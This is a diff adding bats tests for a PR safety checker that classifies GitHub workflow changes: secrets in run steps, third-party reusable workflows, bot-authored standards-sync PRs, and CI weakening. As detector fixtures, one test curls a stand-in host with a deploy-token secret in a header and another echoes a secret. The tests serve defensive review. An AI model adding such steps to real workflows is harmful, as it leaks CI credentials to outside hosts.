@@ -518,3 +518,170 @@ diff --git a/b/unrelated.txt b/b/unrelated.txt
   echo "$output" | grep -q "CI_WEAKENING_DETECTED:"
   echo "$output" | grep -q "PROMPT_INJECTION_DETECTED:"
 }
+
+# ---------------------------------------------------------------------------
+# Check 8 — Trusted first-party stub / standards-sync classification
+# ---------------------------------------------------------------------------
+
+@test "secret-in-run: flags a secret interpolated into a run step" {
+  local diff='--- a/.github/workflows/deploy.yml
++++ b/.github/workflows/deploy.yml
+@@ -3,2 +3,4 @@ jobs:
+   deploy:
++      - run: |
++          curl -H "t: ${{ secrets.DEPLOY_TOKEN }}" https://x.example'
+  run sc_secret_in_run "$diff"
+  [ "$status" -eq 0 ]
+  echo "$output" | grep -q "secret interpolated directly into a run step"
+}
+
+@test "secret-in-run: does NOT flag secrets: inherit forwarding" {
+  local diff='--- a/.github/workflows/pr-auto-review.yml
++++ b/.github/workflows/pr-auto-review.yml
+@@ -3,2 +3,3 @@ jobs:
+   review:
++    secrets: inherit'
+  run sc_secret_in_run "$diff"
+  [ "$status" -eq 0 ]
+  [ -z "$output" ]
+}
+
+@test "secret-in-run: does NOT flag a secret mapped in a secrets: block" {
+  local diff='--- a/.github/workflows/x.yml
++++ b/.github/workflows/x.yml
+@@ -3,2 +3,4 @@ jobs:
+   x:
++    secrets:
++      GH_PAT: ${{ secrets.GH_PAT_DON_PETRY }}'
+  run sc_secret_in_run "$diff"
+  [ "$status" -eq 0 ]
+  [ -z "$output" ]
+}
+
+@test "thirdparty-reusable: flags a non-petry-projects reusable workflow call" {
+  local diff='--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -3,2 +3,3 @@ jobs:
+   x:
++    uses: some-vendor/actions/.github/workflows/build.yml@v1'
+  run sc_thirdparty_reusable "$diff"
+  [ "$status" -eq 0 ]
+  echo "$output" | grep -q "third-party reusable workflow call added (owner: some-vendor)"
+}
+
+@test "thirdparty-reusable: does NOT flag a petry-projects reusable call" {
+  local diff='--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -3,2 +3,3 @@ jobs:
+   x:
++    uses: petry-projects/.github/.github/workflows/pr-auto-review.yml@pr-auto-review/v1-stable'
+  run sc_thirdparty_reusable "$diff"
+  [ "$status" -eq 0 ]
+  [ -z "$output" ]
+}
+
+@test "thirdparty-reusable: does NOT flag an ordinary action pin (no .yml@)" {
+  local diff='--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -3,2 +3,3 @@ jobs:
+   x:
++      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683'
+  run sc_thirdparty_reusable "$diff"
+  [ "$status" -eq 0 ]
+  [ -z "$output" ]
+}
+
+@test "trusted-stub-sync: true for a bot-authored workflow-only secrets:inherit sync" {
+  local meta='{"title":"chore: sync 2 org-standard workflow stub(s) from petry-projects/.github","author":{"login":"donpetry-bot"},"files":[{"path":".github/workflows/dev-lead.yml"},{"path":".github/workflows/pr-auto-review.yml"}]}'
+  local diff='--- a/.github/workflows/pr-auto-review.yml
++++ b/.github/workflows/pr-auto-review.yml
+@@ -3,2 +3,3 @@ jobs:
+   review:
++    secrets: inherit'
+  run sc_trusted_stub_sync "$meta" "$diff"
+  [ "$status" -eq 0 ]
+  echo "$output" | grep -q "TRUSTED_STUB_SYNC: true"
+  echo "$output" | grep -q "STANDARDS_SYNC_PR: true"
+  echo "$output" | grep -q "WORKFLOW_ONLY_CHANGE: true"
+}
+
+@test "trusted-stub-sync: false when a secret is piped into a run step" {
+  local meta='{"title":"chore: sync org-standard workflow stub","author":{"login":"donpetry-bot"},"files":[{"path":".github/workflows/deploy.yml"}]}'
+  local diff='--- a/.github/workflows/deploy.yml
++++ b/.github/workflows/deploy.yml
+@@ -3,2 +3,4 @@ jobs:
+   deploy:
++      - run: |
++          echo "${{ secrets.DEPLOY_TOKEN }}"'
+  run sc_trusted_stub_sync "$meta" "$diff"
+  [ "$status" -eq 0 ]
+  echo "$output" | grep -q "SECRET_IN_RUN_STEP: true"
+  echo "$output" | grep -q "TRUSTED_STUB_SYNC: false"
+}
+
+@test "trusted-stub-sync: false when a third-party reusable is added" {
+  local meta='{"title":"chore: sync org-standard workflow stub","author":{"login":"donpetry-bot"},"files":[{"path":".github/workflows/ci.yml"}]}'
+  local diff='--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -3,2 +3,3 @@ jobs:
+   x:
++    uses: some-vendor/actions/.github/workflows/build.yml@v1'
+  run sc_trusted_stub_sync "$meta" "$diff"
+  [ "$status" -eq 0 ]
+  echo "$output" | grep -q "THIRD_PARTY_REUSABLE_ADDED: true"
+  echo "$output" | grep -q "TRUSTED_STUB_SYNC: false"
+}
+
+@test "trusted-stub-sync: false for a non-workflow file in the diff" {
+  local meta='{"title":"feat: add login","author":{"login":"rachel-petry"},"files":[{"path":"src/auth.ts"},{"path":".github/workflows/ci.yml"}]}'
+  local diff='--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -3,2 +3,3 @@ jobs:
+   review:
++    secrets: inherit'
+  run sc_trusted_stub_sync "$meta" "$diff"
+  [ "$status" -eq 0 ]
+  echo "$output" | grep -q "WORKFLOW_ONLY_CHANGE: false"
+  echo "$output" | grep -q "TRUSTED_STUB_SYNC: false"
+}
+
+@test "trusted-stub-sync: false for a human-authored stub edit (not sync class)" {
+  local meta='{"title":"tweak workflow timeout","author":{"login":"rachel-petry"},"files":[{"path":".github/workflows/ci.yml"}]}'
+  local diff='--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -3,2 +3,3 @@ jobs:
+   review:
++    secrets: inherit'
+  run sc_trusted_stub_sync "$meta" "$diff"
+  [ "$status" -eq 0 ]
+  echo "$output" | grep -q "STANDARDS_SYNC_PR: false"
+  echo "$output" | grep -q "TRUSTED_STUB_SYNC: false"
+}
+
+@test "compute: demotes description/large-pr gates to info under a trusted stub sync" {
+  local meta='{"title":"chore: sync 3 org-standard workflow stub(s) from petry-projects/.github","author":{"login":"donpetry-bot"},"changedFiles":3,"body":"Automated sync.","files":[{"path":".github/workflows/a.yml"},{"path":".github/workflows/b.yml"},{"path":".github/workflows/c.yml"}]}'
+  local diff='--- a/.github/workflows/a.yml
++++ b/.github/workflows/a.yml
+@@ -3,2 +3,3 @@ jobs:
+   review:
++    secrets: inherit'
+  run compute_safety_checks "$meta" "$diff"
+  [ "$status" -eq 0 ]
+  echo "$output" | grep -q "TRUSTED_STUB_SYNC: true"
+  # description gate present but demoted to informational, not escalate
+  echo "$output" | grep -q "\[info\] description-quality"
+  ! echo "$output" | grep -q "\[escalate\] description-quality"
+  echo "$output" | grep -q "\[info\] trusted-stub-sync"
+}
+
+@test "compute: hard-stops still fire even under a trusted stub sync" {
+  local meta='{"title":"chore: sync org-standard workflow stub","author":{"login":"donpetry-bot"},"files":[{"path":".github/workflows/a.yml"}]}'
+  local diff='--- a/.github/workflows/a.yml
++++ b/.github/workflows/a.yml
+@@ -3,2 +3,3 @@ jobs:
+   review:
++      continue-on-error: true'
+  run compute_safety_checks "$meta" "$diff"
+  [ "$status" -eq 0 ]
+  echo "$output" | grep -q "CI_WEAKENING_DETECTED: true"
+}
